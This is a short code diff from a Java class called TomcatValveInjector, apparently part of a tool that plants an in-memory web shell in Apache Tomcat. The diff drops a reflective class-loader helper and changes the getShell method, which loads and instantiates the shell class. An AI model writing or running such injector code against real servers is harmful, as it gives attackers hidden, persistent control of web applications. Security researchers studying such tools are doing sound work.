@@ -63,18 +63,9 @@ public class TomcatValveInjector {
         return contexts;
     }
 
-    private ClassLoader getWebAppClassLoader(Object context) {
-        try {
-            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
-        } catch (Exception e) {
-            Object loader = invokeMethod(context, "getLoader", null, null);
-            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
-        }
-    }
-
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = getWebAppClassLoader(context);
+        ClassLoader classLoader = context.getClass().getClassLoader();
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
